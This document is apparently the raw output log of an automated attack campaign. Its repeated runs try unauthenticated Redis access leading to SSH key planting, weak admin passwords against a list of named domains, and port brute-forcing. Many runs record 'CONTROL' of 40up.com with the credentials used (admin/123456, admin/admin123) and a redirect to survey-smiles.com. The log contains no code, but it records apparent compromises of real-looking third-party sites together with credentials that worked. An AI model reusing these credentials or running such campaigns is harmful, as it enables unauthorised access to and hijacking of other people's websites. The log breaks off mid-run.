  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 04:47:54 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 04:55:53 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 04:56:04 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 05:44:48 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 05:45:00 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 05:56:37 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 05:56:50 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 06:48:17 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 06:48:30 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 06:58:36 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 06:58:47 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 07:48:20 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 07:48:34 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 07:55:49 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 07:56:04 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 08:51:30 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 08:51:43 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 09:02:17 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 09:02:29 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 09:52:20 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 09:52:35 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 10:02:30 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 10:02:43 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 10:49:39 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 10:49:57 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 10:59:46 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 11:00:06 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 11:51:47 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 11:52:01 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 12:01:46 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 12:02:06 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 12:52:00 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 12:54:11 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 13:01:38 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 13:04:48 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 13:52:00 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 13:53:42 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 14:01:55 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 14:04:39 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 14:51:15 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 14:53:15 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 14:58:19 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 15:01:38 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 15:50:52 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 15:53:23 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 16:01:56 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 16:04:06 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 16:52:50 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 16:54:51 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 17:02:54 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 17:05:01 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 17:51:28 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 17:52:37 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 17:58:57 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 18:01:26 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 18:48:32 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 18:49:44 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 18:57:55 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 19:00:24 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 19:48:03 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 19:49:25 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 19:57:42 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 20:00:07 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 20:48:47 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 20:50:17 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 20:59:25 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 21:01:37 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 21:51:04 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 21:52:39 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 22:02:04 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 22:03:28 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 22:50:28 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 22:52:05 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 23:00:00 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 23:02:52 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 23:50:54 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 23:52:29 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 00:01:04 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 00:02:47 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 00:50:53 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 00:53:48 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 00:59:13 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 01:02:14 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 01:50:37 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 01:52:22 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 02:01:43 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 02:03:06 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 02:51:40 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 02:53:35 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 03:00:49 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 03:03:45 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 03:51:02 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 03:53:04 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 04:02:01 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 04:04:01 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 04:52:41 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 04:54:20 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 05:01:34 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 05:04:41 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 05:47:46 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 05:49:22 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 05:56:53 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 05:59:58 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 06:51:08 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 06:52:41 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 06:59:50 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
  admin balibags.com
  admin bliestek.com
  admin c-icc.cn
  admin cafeignite.com
  admin caoxianfc.com
  admin caringrus.com
[3] port brute
=== AUTO ATTACK END Fri Aug  7 07:03:17 UTC 2026 ===
=== AUTO ATTACK Fri Aug  7 07:50:21 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin alohar.com
  admin amzop.com
  admin an-yun.net
  admin anhaozuche.com
  admin api.nongji360.com
  admin auth.nongji360.com
  admin b2b.huangye88.com
  admin baldem.com
